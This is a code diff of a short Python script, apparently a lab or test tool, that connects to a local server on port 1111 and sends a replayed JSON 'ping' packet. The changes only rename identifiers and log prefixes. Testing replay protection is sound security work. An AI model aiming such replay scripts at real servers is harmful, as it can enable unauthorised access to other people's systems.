@@ -2,14 +2,15 @@ import socket
 import json
 import time
 
-TARGET_IP = "127.0.0.1"
-TARGET_PORT = 1111
+SERVER_IP = "127.0.0.1"
+SERVER_PORT = 1111
 
-def attack_replay():
+def replay_attack():
+    print("\n--- REPLAY ATTACK ---")
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect((TARGET_IP, TARGET_PORT))
-        print(f"[*] Connected to {TARGET_IP}:{TARGET_PORT}")
+        client.connect((SERVER_IP, SERVER_PORT))
+        print(f"[INFO] Connected to {SERVER_IP}:{SERVER_PORT}")
 
         replay_packet = {
             "action": "ping",
@@ -19,13 +20,13 @@ def attack_replay():
         
         payload = json.dumps(replay_packet).encode('utf-8') + b'\n'
         client.send(payload)
-        print(f"[+] Sent Replay Packet: {replay_packet}")
+        print(f"[INFO] Sent Replay Packet: {replay_packet}")
 
         time.sleep(1)
         client.close()
         
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[ERROR] {e}")
 
 if __name__ == "__main__":
-    attack_replay()
+    replay_attack()
